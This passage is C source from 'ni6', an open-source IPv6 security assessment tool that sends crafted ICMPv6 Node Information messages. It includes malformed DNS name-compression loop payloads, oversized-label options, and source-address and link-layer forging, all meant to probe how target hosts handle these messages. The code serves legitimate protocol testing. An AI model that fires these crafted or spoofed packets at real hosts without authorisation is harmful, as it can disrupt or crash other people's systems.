/*
 * ni6: A security assessment tool that exploits potential flaws
 *      in the processing of ICMPv6 Node Information messages
 *
 * Copyright (C) 2011-2013 Fernando Gont <fgont@si6networks.com>
 *
 * Programmed by Fernando Gont for SI6 Networks <http://www.si6networks.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * 
 * Build with: make ni6
 * 
 * It requires that the libpcap library be installed on your system.
 *
 * Please send any bug reports to Fernando Gont <fgont@si6networks.com>
 */

#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <getopt.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <strings.h>
#include <pcap.h>
#include <sys/types.h>
#include <sys/param.h>
#include <setjmp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <pwd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <ifaddrs.h>
#ifdef __linux__
	#include <netpacket/packet.h>
#elif defined (__FreeBSD__) || defined(__NetBSD__) || defined (__OpenBSD__) || defined(__APPLE__) || ( !defined(__FreeBSD__) && defined(__FreeBSD_kernel__))
	#include <net/if_dl.h>
#endif
#include "ni6.h"
#include "ipv6toolkit.h"
#include "libipv6.h"
#include <netinet/tcp.h>
#include <netinet/udp.h>


/* Function prototypes */
void				init_packet_data(struct iface_data *);
int					send_packet(struct iface_data *, const u_char *, struct pcap_pkthdr *);
void				print_attack_info(struct iface_data *);
void				usage(void);
void				print_help(void);
int					print_ni_data(struct iface_data *, const u_char *, struct pcap_pkthdr *);
int					print_ni_addr(struct iface_data *, const u_char *, struct pcap_pkthdr *);
int					print_ni_addr6(struct iface_data *, const u_char *, struct pcap_pkthdr *);
int					print_ni_name(struct iface_data *, const u_char *, struct pcap_pkthdr *);
int					print_ni_noop(struct iface_data *, const u_char *, struct pcap_pkthdr *);


/* Variables used for learning the default router */
struct iface_data	idata;
struct ether_addr	rs_ether;
struct in6_addr		rs_ipv6;
struct in6_addr		randprefix;
unsigned char		randpreflen;


/* Data structures for packets read from the wire */
struct pcap_pkthdr	*pkthdr;
const u_char		*pktdata;
unsigned char		*pkt_end;
struct ether_header	*pkt_ether;
struct ip6_hdr		*pkt_ipv6;
struct in6_addr		*pkt_ipv6addr;
struct icmp6_nodeinfo *pkt_ni;
unsigned int		pktbytes;


bpf_u_int32			my_netmask;
bpf_u_int32			my_ip;
struct bpf_program	pcap_filter;
char 				dev[64], errbuf[PCAP_ERRBUF_SIZE];
unsigned char		buffer[65556], buffrh[MIN_IPV6_HLEN + MIN_TCP_HLEN];
char				domain[MAX_DOMAIN_LEN];
unsigned char		*v6buffer, *ptr, *startofprefixes;
char				*pref;
    
struct ip6_hdr		*ipv6;
struct icmp6_hdr	*icmp6;
struct icmp6_nodeinfo *ni;

struct ether_header	*ethernet;

char				*lasts, *rpref;
char				*charptr, *printname, *printnamed;

size_t				nw;
unsigned long		ul_res, ul_val;
unsigned int		i, j, startrand;
unsigned int		skip;
unsigned int		nsleep;
unsigned char		srcpreflen;

u_int16_t			mask;
u_int8_t			hoplimit;

char 				plinkaddr[ETHER_ADDR_PLEN];
char 				psrcaddr[INET6_ADDRSTRLEN], pdstaddr[INET6_ADDRSTRLEN], pv6addr[INET6_ADDRSTRLEN];
unsigned char 		iface_f=0;
unsigned char 		rand_src_f=0, forgeether_f=0;
unsigned char 		listen_f = 0, multicastdst_f=0, accepted_f=0, loop_f=0, sleep_f=0;
unsigned char		srcprefix_f=0, hoplimit_f=0, flags_f=0, exceedp_f=0, snamedslabel_f=0;
unsigned char		floods_f=0, name_f=0, fname_f=0, ipv6addr_f=0, ipv4addr_f=0, maxlabel_f=0;
unsigned char		named_f=0, fnamed_f=0, ipv6addrd_f=0, ipv4addrd_f=0, exceedpd_f=0;
unsigned char		payloadsize_f=0, qtype_f=0, code_f=0, snameslabel_f=0, sloopattack_f=0;
unsigned char		dloopattack_f=0;

/* Support for Extension Headers */
unsigned int		dstopthdrs, dstoptuhdrs, hbhopthdrs;
char				hbhopthdr_f=0, dstoptuhdr_f=0, dstopthdr_f=0;
unsigned char		*dstopthdr[MAX_DST_OPT_HDR], *dstoptuhdr[MAX_DST_OPT_U_HDR];
unsigned char		*hbhopthdr[MAX_HBH_OPT_HDR];
unsigned int		dstopthdrlen[MAX_DST_OPT_HDR], dstoptuhdrlen[MAX_DST_OPT_U_HDR];
unsigned int		hbhopthdrlen[MAX_HBH_OPT_HDR], m, pad;

struct ip6_frag		fraghdr, *fh;
struct ip6_hdr		*fipv6;
unsigned char		fragh_f=0;
unsigned char		fragbuffer[ETHER_HDR_LEN+MIN_IPV6_HLEN+MAX_IPV6_PAYLOAD];
unsigned char		*fragpart, *fptr, *fptrend, *ptrend, *ptrhdr, *ptrhdrend;
unsigned int		hdrlen, ndstopthdr=0, nhbhopthdr=0, ndstoptuhdr=0;
unsigned int		nfrags, fragsize;
unsigned char		*prev_nh, *startoffragment;

/* ICMPv6 NI */
struct in_addr		ipv4addr, ipv4addrd;
struct in6_addr		ipv6addr, ipv6addrd;
unsigned int		maxlabel, slvariant, slsize, dlvariant, dlsize;
char				*name, *named;
unsigned int		fnamelen, exceedp, fnamedlen, exceedpd, payloadsize;
int					namelen, namedlen;
u_int8_t			qtype, type;
u_int8_t			code=0;
u_int16_t			flags=0;
unsigned char		*slpointer, *dlpointer;

struct filters		filters;


int main(int argc, char **argv){
	extern char		*optarg;
	int				r, sel;
	fd_set			sset, rset;
	time_t			curtime, lastni=0, start=0;
	struct timeval	timeout;

	/* For queries only: loops to the beginning of the same label (shouldn't work) */
	unsigned char	dnsloopq0[]={0x04, 0x61, 0x61, 0x61, 0x61, 0x0c, 0x00};
	/* For queries only: loops on a single byte label (shouldn't work) */
	unsigned char	dnsloopq1[]={0x04, 0x61, 0x61, 0x61, 0x61, 0x0c, 0x05};

	/* Loops to the beginning of the same label */
	unsigned char	dnsloopr0[]={0x04, 0x61, 0x61, 0x61, 0x61, 0x0c, 0x04};
	/* Loops on a single byte */
	unsigned char	dnsloopr1[]={0x04, 0x61, 0x61 , 0x61, 0x61, 0x0c, 0x09};
	/* Loops to the beginning of a previous label */
	unsigned char	dnsloopr2[]={0x04, 0x61, 0x61, 0x61, 0x61, 0x00, 0x03, 0x61 , 0x61, 0x61, 0x0c, 0x04};

	static struct option longopts[] = {
		{"interface", required_argument, 0, 'i'},
		{"src-addr", required_argument, 0, 's'},
		{"dst-addr", required_argument, 0, 'd'},
		{"hop-limit", required_argument, 0, 'c'},
		{"dst-opt-hdr", required_argument, 0, 'u'},
		{"dst-opt-u-hdr", required_argument, 0, 'U'},
		{"hbh-opt-hdr", required_argument, 0, 'H'},
		{"frag-hdr", required_argument, 0, 'y'},
		{"link-src-addr", required_argument, 0, 'S'},
		{"link-dst-addr", required_argument, 0, 'D'},
		{"payload-size", required_argument, 0, 'P'},
		{"subject-ipv4", required_argument, 0, '4'},
		{"subject-ipv6", required_argument, 0, '6'},
		{"subject-name", required_argument, 0, 'n'},
		{"subject-fname", required_argument, 0, 'N'},
		{"subject-ename", required_argument, 0, 'x'},
		{"subject-nloop", required_argument, 0, 'o'},
		{"max-label-size", required_argument, 0, 'Z'},
		{"sname-slabel", no_argument, 0, 'e'},
		{"code", required_argument, 0, 'C'},
		{"qtype", required_argument, 0, 'q'},
		{"flags", required_argument, 0, 'X'},
		{"data-ipv6", required_argument, 0, 'w'},
		{"data-ipv4", required_argument, 0, 'W'},
		{"data-name", required_argument, 0, 'a'},
		{"data-fname", required_argument, 0, 'A'},
		{"data-ename", required_argument, 0, 'Q'},
		{"data-nloop", required_argument, 0, 'O'},
		{"dname-slabel", no_argument, 0, 'E'},
		{"block-src-addr", required_argument, 0, 'j'},
		{"block-dst-addr", required_argument, 0, 'k'},
		{"block-link-src-addr", required_argument, 0, 'J'},
		{"block-link-dst-addr", required_argument, 0, 'K'},
		{"accept-src-addr", required_argument, 0, 'b'},
		{"accept-dst-addr", required_argument, 0, 'g'},
		{"accept-link-src-addr", required_argument, 0, 'B'},
		{"accept-link-dst-addr", required_argument, 0, 'G'},
		{"forge-src-addr", no_argument, 0, 'r'},
		{"forge-link-src-addr", no_argument, 0, 'R'},
		{"loop", no_argument, 0, 'l'},
		{"sleep", required_argument, 0, 'z'},
		{"listen", no_argument, 0, 'L'},
		{"verbose", no_argument, 0, 'v'},
		{"help", no_argument, 0, 'h'}
	};

	char shortopts[]= "i:s:d:c:u:U:H:y:S:D:P:4:6:n:N:x:o:Z:eC:q:X:w:W:a:A:Q:O:Ej:k:J:K:b:g:B:G:lz:Lvh";

	char option;

	if(argc<=1){
		usage();
		exit(EXIT_FAILURE);
	}

	srandom(time(NULL));
	hoplimit=64+random()%180;

	/* Initialize filters structure */
	if(init_filters(&filters) == -1){
		puts("Error initializing internal data structure");
		exit(EXIT_FAILURE);
	}

	if(init_iface_data(&idata) == FAILURE){
		puts("Error initializing internal data structure");
		exit(EXIT_FAILURE);
	}

	while((r=getopt_long(argc, argv, shortopts, longopts, NULL)) != -1) {
		option= r;

		switch(option){
			case 'i':  /* Interface */
				strncpy(idata.iface, optarg, IFACE_LENGTH-1);
				idata.iface[IFACE_LENGTH-1]=0;
				idata.ifindex= if_nametoindex(idata.iface);
				idata.iface_f=TRUE;
				break;

			case 's':	/* IPv6 Source Address */
				if((charptr = strtok_r(optarg, "/", &lasts)) == NULL){
					puts("Error in Source Address");
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, charptr, &(idata.srcaddr)) <= 0){
					puts("inet_pton(): Source Address not valid");
					exit(EXIT_FAILURE);
				}

				idata.srcaddr_f = 1;
		
				if((charptr = strtok_r(NULL, " ", &lasts)) != NULL){
					srcpreflen = atoi(charptr);
		
					if(srcpreflen>128){
						puts("Prefix length error in IPv6 Source Address");
						exit(EXIT_FAILURE);
					}

					sanitize_ipv6_prefix(&(idata.srcaddr), srcpreflen);
					srcprefix_f=1;
				}

				break;
	    
			case 'd':	/* IPv6 Destination Address */
				if( inet_pton(AF_INET6, optarg, &(idata.dstaddr)) <= 0){
					puts("inet_pton(): address not valid");
					exit(EXIT_FAILURE);
				}

				type= ICMP6_NI_QUERY;
				idata.dstaddr_f = 1;
				break;

			case 'c':	/* Hop Limit */
				hoplimit= atoi(optarg);
				hoplimit_f=1;
				break;

			case 'u':	/* Destinations Options Header */
				if(ndstopthdr >= MAX_DST_OPT_HDR){
					puts("Too many Destination Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				dstopthdrlen[ndstopthdr]= hdrlen;

				if( (dstopthdr[ndstopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstopthdr[ndstopthdr] + 2;
				ptrhdrend= dstopthdr[ndstopthdr] + hdrlen;

				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;
			
					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header Too Big");
						exit(EXIT_FAILURE);
					}
		    
					ptrhdr= ptrhdr + pad;
				}

				*(dstopthdr[ndstopthdr]+1)= (hdrlen/8)-1;
				ndstopthdr++;
				dstopthdr_f=1;
				break;

			case 'U':	/* Destination Options Header (Unfragmentable Part) */
				if(ndstoptuhdr >= MAX_DST_OPT_U_HDR){
					puts("Too many Destination Options Headers (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen = ((hdrlen+7)/8) * 8;
				dstoptuhdrlen[ndstoptuhdr]= hdrlen;
		
				if( (dstoptuhdr[ndstoptuhdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstoptuhdr[ndstoptuhdr]+2;
				ptrhdrend= dstoptuhdr[ndstoptuhdr] + hdrlen;
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header (Unfragmentable Part) Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(dstoptuhdr[ndstoptuhdr]+1)= (hdrlen/8) - 1;
				ndstoptuhdr++;
				dstoptuhdr_f=1;
				break;

			case 'H':	/* Hop-by-Hop Options Header */
				if(nhbhopthdr >= MAX_HBH_OPT_HDR){
					puts("Too many Hop-by-Hop Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen <= 8){
					puts("Bad length in Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				hbhopthdrlen[nhbhopthdr]= hdrlen;
		
				if( (hbhopthdr[nhbhopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= hbhopthdr[nhbhopthdr] + 2;
				ptrhdrend= hbhopthdr[nhbhopthdr] + hdrlen;
		
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Hop-by-Hop Options Header Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(hbhopthdr[nhbhopthdr]+1)= (hdrlen/8) - 1;
				nhbhopthdr++;
				hbhopthdr_f=1;
				break;

			case 'y':	/* Fragment header */
				nfrags= atoi(optarg);
				if(nfrags < 8){
					puts("Error in Fragmentation option: Fragment Size must be at least 8 bytes");
					exit(EXIT_FAILURE);
				}
		
				nfrags = (nfrags +7) & 0xfff8;
				fragh_f= 1;
				break;

			case 'S':	/* Source Ethernet address */
				if(ether_pton(optarg, &(idata.hsrcaddr), sizeof(idata.hsrcaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				idata.hsrcaddr_f = 1;
				break;

			case 'D':	/* Destination Ethernet Address */
				if(ether_pton(optarg, &(idata.hdstaddr), sizeof(idata.hdstaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				idata.hdstaddr_f = 1;
				break;

			case '6':	/* Subject: IPv6 address */

				if ( inet_pton(AF_INET6, optarg, &ipv6addr) <= 0){
					puts("inet_pton(): Subject Address not valid");
					exit(EXIT_FAILURE);
				}

				ipv6addr_f = 1;
				break;

			case '4':	/* Subject: IPv4 address */

				if( inet_pton(AF_INET, optarg, &ipv4addr) <= 0){
					puts("inet_pton(): Subject Address not valid");
					exit(EXIT_FAILURE);
				}

				ipv4addr_f = 1;
				break;

			case 'n':	/* Subject: Name */
				printname= optarg;
				namelen= strlen(optarg) + 1;
				
				
				if( (name=malloc(namelen + 1)) == NULL){
					puts("Error allocating memory");
					exit(EXIT_FAILURE);
				}

				if( (namelen=dns_str2wire(optarg, namelen, name, namelen+1)) == -1){
					puts("inet_pton(): Error while converting name to DNS wire format");
					exit(EXIT_FAILURE);
				}

				name_f = 1;
				break;

			case 'N':	/* Subject: Name of an arbitrary length */
				fnamelen= atoi(optarg);
				fname_f= 1;
				break;

			case 'x':	/* Subject: DNS wire label that exceeeds packet size */
				exceedp= atoi(optarg);
				exceedp_f= 1;
				break;

			case 'o':
				slvariant=atoi(optarg);
				sloopattack_f=1;
				break;

			case 'P':	/* Payload Size */
				payloadsize= atoi(optarg);
				payloadsize_f= 1;
				break;

			case 'w':	/* Data: IPv6 address */

				if ( inet_pton(AF_INET6, optarg, &ipv6addrd) <= 0){
					puts("inet_pton(): Redirected Address not valid");
					exit(EXIT_FAILURE);
				}

				ipv6addrd_f = 1;
				break;

			case 'W':	/* Data: IPv4 address */

				if( inet_pton(AF_INET, optarg, &ipv4addrd) <= 0){
					puts("inet_pton(): Redirected Address not valid");
					exit(EXIT_FAILURE);
				}

				ipv4addrd_f = 1;
				break;

			case 'a':	/* Data: Name */
				printnamed= optarg;
				namedlen= strlen(optarg) + 1;
				
				if( (named=malloc(namedlen + 1)) == NULL){
					puts("Error allocating memory");
					exit(EXIT_FAILURE);
				}

				if( (namedlen=dns_str2wire(optarg, namedlen, named, namedlen+1)) == -1){
					puts("inet_pton(): Error while converting name to DNS wire format");
					exit(EXIT_FAILURE);
				}

				named_f = 1;
				break;

			case 'A':	/* Data: Name of an arbitrary length */
				fnamedlen= atoi(optarg);
				fnamed_f= 1;
				break;

			case 'Q':	/* Data: DNS wire label that exceeeds packet size */
				exceedpd= atoi(optarg);
				exceedpd_f= 1;
				break;

			case 'O':
				dlvariant=atoi(optarg);
				dloopattack_f=1;
				break;

			case 'E':	/* Data is a Single label name */
				snamedslabel_f=1;
				break;

			case 'Z':	/* Max DNS label size (defaults to 63) */
				maxlabel= atoi(optarg);

				if(maxlabel < 1){
					puts("Error: max-label-size too small");
					exit(EXIT_FAILURE);
				}

				maxlabel_f= 1;
				break;

			case 'e':	/* Subject is a Single label name */
				snameslabel_f=1;
				break;

			case 'C':	/* ICMPv6 code */
				code= atoi(optarg);
				code_f= 1;
				break;

			case 'q':	/* Qtype */
				qtype= atoi(optarg);
				qtype_f= 1;
				break;

			case 'X':
				charptr = optarg;
				while(*charptr){
					switch(*charptr){
						case 'G':
							flags= flags | NI_NODEADDR_FLAG_GLOBAL;
							break;

						case 'S':
							flags= flags | NI_NODEADDR_FLAG_SITELOCAL;
							break;

						case 'L':
							flags= flags | NI_NODEADDR_FLAG_LINKLOCAL;
							break;

						case 'C':
							flags= flags | NI_NODEADDR_FLAG_COMPAT;
							break;

						case 'A':
							flags= flags | NI_NODEADDR_FLAG_ALL;
							break;

						case 'T':
							flags= flags | NI_NODEADDR_FLAG_TRUNCATE;
							break;

						case 'X': /* No flags */
							break;

						default:
							printf("Unknown TCP flag '%c'\n", *charptr);
							exit(EXIT_FAILURE);
							break;
					}

					if(*charptr == 'X')
						break;

					charptr++;
				}

				flags_f=1;
				break;

			case 'j':	/* IPv6 Source Address (block) filter */
				if(filters.nblocksrc >= MAX_BLOCK_SRC){
					puts("Too many IPv6 Source Address (block) filters.");
					exit(EXIT_FAILURE);
				}
	    
				if((pref = strtok_r(optarg, "/", &lasts)) == NULL){
					printf("Error in IPv6 Source Address (block) filter number %u.\n", \
												filters.nblocksrc+1);
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, pref, &(filters.blocksrc[filters.nblocksrc])) <= 0){
					printf("Error in IPv6 Source Address (block) filter number %u.", \
											    filters.nblocksrc+1);
					exit(EXIT_FAILURE);
				}

				if((charptr = strtok_r(NULL, " ", &lasts)) == NULL){
		    			filters.blocksrclen[filters.nblocksrc] = 128;
				}
				else{
					filters.blocksrclen[filters.nblocksrc] = atoi(charptr);

					if(filters.blocksrclen[filters.nblocksrc]>128){
						printf("Length error in IPv6 Source Address (block) filter number %u.\n", \
													filters.nblocksrc+1);
						exit(EXIT_FAILURE);
		    		}
				}

				sanitize_ipv6_prefix(&(filters.blocksrc[filters.nblocksrc]), filters.blocksrclen[filters.nblocksrc]);
				(filters.nblocksrc)++;
				break;

			case 'k':	/* IPv6 Destination Address (block) filter */
				if(filters.nblockdst >= MAX_BLOCK_DST){
					puts("Too many IPv6 Destination Address (block) filters.");
					exit(EXIT_FAILURE);
				}

				if((pref = strtok_r(optarg, "/", &lasts)) == NULL){
					printf("Error in IPv6 Destination Address (block) filter number %u.\n", \
													filters.nblockdst+1);
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, pref, &(filters.blockdst[filters.nblockdst])) <= 0){
					printf("Error in IPv6 Source Address (block) filter number %u.", \
											    filters.nblockdst+1);
					exit(EXIT_FAILURE);
				}

				if((charptr = strtok_r(NULL, " ", &lasts)) == NULL){
					filters.blockdstlen[filters.nblockdst] = 128;
				}
				else{
					filters.blockdstlen[filters.nblockdst] = atoi(charptr);
		
					if(filters.blockdstlen[filters.nblockdst]>128){
						printf("Length error in IPv6 Source Address (block) filter number %u.\n", \
													    filters.nblockdst+1);
						exit(EXIT_FAILURE);
					}
				}
		
				sanitize_ipv6_prefix(&(filters.blockdst[filters.nblockdst]), filters.blockdstlen[filters.nblockdst]);
				filters.nblockdst++;
				break;

			case 'J':	/* Link Source Address (block) filter */
				if(filters.nblocklinksrc > MAX_BLOCK_LINK_SRC){
					puts("Too many link-layer Source Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if(ether_pton(optarg, &(filters.blocklinksrc[filters.nblocklinksrc]), sizeof(struct ether_addr)) == 0){
					printf("Error in link-layer Source Address (blick) filter number %u.\n", \
												    filters.nblocklinksrc+1);
					exit(EXIT_FAILURE);
				}
		
				(filters.nblocklinksrc)++;
				break;

			case 'K':	/* Link Destination Address (block) filter */
				if(filters.nblocklinkdst > MAX_BLOCK_LINK_DST){
					puts("Too many link-layer Destination Address (block) filters.");
					exit(EXIT_FAILURE);
				}

				if(ether_pton(optarg, &(filters.blocklinkdst[filters.nblocklinkdst]), sizeof(struct ether_addr)) == 0){
					printf("Error in link-layer Destination Address (blick) filter number %u.\n", \
												    filters.nblocklinkdst+1);
					exit(EXIT_FAILURE);
				}
		
				filters.nblocklinkdst++;
				break;

			case 'b':	/* IPv6 Source Address (accept) filter */
				if(filters.nacceptsrc > MAX_ACCEPT_SRC){
					puts("Too many IPv6 Source Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if((pref = strtok_r(optarg, "/", &lasts)) == NULL){
					printf("Error in IPv6 Source Address (accept) filter number %u.\n", \
												filters.nacceptsrc+1);
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, pref, &(filters.acceptsrc[filters.nacceptsrc])) <= 0){
					printf("Error in IPv6 Source Address (accept) filter number %u.\n", \
												filters.nacceptsrc+1);
					exit(EXIT_FAILURE);
				}
		
				if((charptr = strtok_r(NULL, " ", &lasts)) == NULL){
					filters.acceptsrclen[filters.nacceptsrc] = 128;
				}
				else{
					filters.acceptsrclen[filters.nacceptsrc] = atoi(charptr);

					if(filters.acceptsrclen[filters.nacceptsrc]>128){
						printf("Length error in IPv6 Source Address (accept) filter number %u.\n", \
														filters.nacceptsrc+1);
						exit(EXIT_FAILURE);
					}
				}

				sanitize_ipv6_prefix(&(filters.acceptsrc[filters.nacceptsrc]), filters.acceptsrclen[filters.nacceptsrc]);
				(filters.nacceptsrc)++;
				filters.acceptfilters_f=1;
				break;


			case 'g':	/* IPv6 Destination Address (accept) filter */
				if(filters.nacceptdst > MAX_ACCEPT_DST){
					puts("Too many IPv6 Destination Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if((pref = strtok_r(optarg, "/", &lasts)) == NULL){
					printf("Error in IPv6 Destination Address (accept) filter number %u.\n", \
													filters.nacceptdst+1);
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, pref, &(filters.acceptdst[filters.nacceptdst])) <= 0){
					printf("Error in IPv6 Source Address (accept) filter number %u.\n", \
												    filters.nacceptdst+1);
					exit(EXIT_FAILURE);
				}

				if((charptr = strtok_r(NULL, " ", &lasts)) == NULL){
					filters.acceptdstlen[filters.nacceptdst] = 128;
				}
				else{
					filters.acceptdstlen[filters.nacceptdst] = atoi(charptr);
		
					if(filters.acceptdstlen[filters.nacceptdst] > 128){
						printf("Length error in IPv6 Source Address (accept) filter number %u.\n", \
													    filters.nacceptdst+1);
						exit(EXIT_FAILURE);
					}
				}
		
				sanitize_ipv6_prefix(&(filters.acceptdst[filters.nacceptdst]), filters.acceptdstlen[filters.nacceptdst]);
				(filters.nacceptdst)++;
				filters.acceptfilters_f=1;
				break;

			case 'B':	/* Link-layer Source Address (accept) filter */
				if(filters.nacceptlinksrc > MAX_ACCEPT_LINK_SRC){
					puts("Too many link-later Source Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if(ether_pton(optarg, &(filters.acceptlinksrc[filters.nacceptlinksrc]), sizeof(struct ether_addr)) == 0){
					printf("Error in link-layer Source Address (accept) filter number %u.\n", \
											    filters.nacceptlinksrc+1);
					exit(EXIT_FAILURE);
				}
		
				(filters.nacceptlinksrc)++;
				filters.acceptfilters_f=1;
				break;

			case 'G':	/* Link Destination Address (accept) filter */
				if(filters.nacceptlinkdst > MAX_ACCEPT_LINK_DST){
					puts("Too many link-layer Destination Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if(ether_pton(optarg, &(filters.acceptlinkdst[filters.nacceptlinkdst]), sizeof(struct ether_addr)) == 0){
					printf("Error in link-layer Destination Address (accept) filter number %u.\n",\
												    filters.nacceptlinkdst+1);
					exit(EXIT_FAILURE);
				}
		
				(filters.nacceptlinkdst)++;
				filters.acceptfilters_f=1;
				break;

			case 'r':
				rand_src_f=1;
				break;

			case 'R':
				forgeether_f=1;
				break;

			case 'l':	/* "Loop mode */
				loop_f = 1;
				break;

			case 'z':	/* Sleep option */
				nsleep=atoi(optarg);
				if(nsleep==0){
					puts("Invalid number of seconds in '-z' option");
					exit(EXIT_FAILURE);
				}
	
				sleep_f=1;
				break;

			case 'L':	/* "Listen mode */
				listen_f = 1;
				break;

			case 'v':	/* Be verbose */
				idata.verbose_f++;
				break;
		
			case 'h':	/* Help */
				print_help();
		
				exit(EXIT_FAILURE);
				break;

			default:
				usage();
				exit(EXIT_FAILURE);
				break;
		
		} /* switch */
	} /* while(getopt) */

	if(geteuid()) {
		puts("ni6 needs root privileges to run.");
		exit(EXIT_FAILURE);
	}

	if(!iface_f){
		puts("Must specify the network interface with the -i option");
		exit(EXIT_FAILURE);
	}

	if(listen_f && loop_f){
		puts("'Error: 'listen' mode and 'loop' mode are incompatible");
		exit(EXIT_FAILURE);
	}
    
	if(!(idata.dstaddr_f) && !listen_f){	/* Must specify IPv6 Destination Address if listening mode not used */
		puts("IPv6 Destination Address not specified (and listening mode not selected)");
		exit(EXIT_FAILURE);
	}


	if(load_dst_and_pcap(&idata, LOAD_SRC_NXT_HOP) == FAILURE){
		puts("Error while learning Souce Address and Next Hop");
		exit(EXIT_FAILURE);
	}

	release_privileges();

	if(!sleep_f)
		nsleep=2;

	if(!maxlabel_f){
		maxlabel=63;
	}

	if(!flags_f){
		switch(qtype){
			case NI_QTYPE_NODEADDR:
				flags= NI_NODEADDR_FLAG_GLOBAL | NI_NODEADDR_FLAG_SITELOCAL | NI_NODEADDR_FLAG_LINKLOCAL |\
						 NI_NODEADDR_FLAG_COMPAT  | NI_NODEADDR_FLAG_ALL;
				break;

			default:
				flags= 0;
				break;
		}
	}

	if( !fragh_f && dstoptuhdr_f){
		puts("Dst. Options Header (Unfragmentable Part) set, but Fragmentation not specified");
		exit(EXIT_FAILURE);
	}
    
	if(fragh_f)
		idata.max_packet_size = MAX_IPV6_PAYLOAD + MIN_IPV6_HLEN;
	else
		idata.max_packet_size = ETH_DATA_LEN;

	if(sloopattack_f){
		if(code_f && code != 1){
			puts("Error: NI code must be '1' for performing name-loop attacks");
			exit(EXIT_FAILURE);
		}
		else{
			code=1;
		}
	}

	if(sloopattack_f){
		switch(slvariant){
			case 0:
				slpointer= (unsigned char *)dnsloopq0;
				slsize= sizeof(dnsloopq0);
				break;

			case 1:
				slpointer= (unsigned char *)dnsloopq1;
				slsize= sizeof(dnsloopq1);
				break;

			default:
				puts("Error: invalid name loop variant (valid values are 0-1)");
				exit(EXIT_FAILURE);
				break;
		}
	}

	if(dloopattack_f){
		switch(dlvariant){
			case 0:
				dlpointer= (unsigned char *)dnsloopr0;
				dlsize= sizeof(dnsloopr0);
				break;

			case 1:
				dlpointer= (unsigned char *)dnsloopr1;
				dlsize= sizeof(dnsloopr1);
				break;

			case 2:
				dlpointer= (unsigned char *)dnsloopr2;
				dlsize= sizeof(dnsloopr2);
				break;

			default:
				puts("Error: invalid name loop variant (valid values are 0-2)");
				exit(EXIT_FAILURE);
				break;
		}
	}

	/* Set initial contents of the attack packet */
	init_packet_data(&idata);

	if( (idata.fd= pcap_fileno(idata.pfd)) == -1){
		puts("Error obtaining descriptor number for pcap_t");
		exit(EXIT_FAILURE);
	}

	FD_ZERO(&sset);
	FD_SET(idata.fd, &sset);

	start= time(NULL);

	/* Fire an ICMPv6 Redirect if an IPv6 Destination Address was specified 	*/
	if(idata.dstaddr_f){
		if(!code_f){
			if(ipv6addr_f){
				code=0;
			}
			else if(name_f || fname_f || exceedp_f || sloopattack_f){
				code=1;
			}
			else if(ipv4addr_f){
				code=2;
			}
			else{
				code=0;
			}
		}

		if(!qtype_f){
			switch(code){
				case 0:
					qtype= NI_QTYPE_NODEADDR;
					break;

				case 1:
					qtype= NI_QTYPE_NODEADDR;
					break;

				case 2:
					qtype= NI_QTYPE_NODEADDR;
					break;

				default:
					qtype= NI_QTYPE_NOOP;
					break;
			}
		}

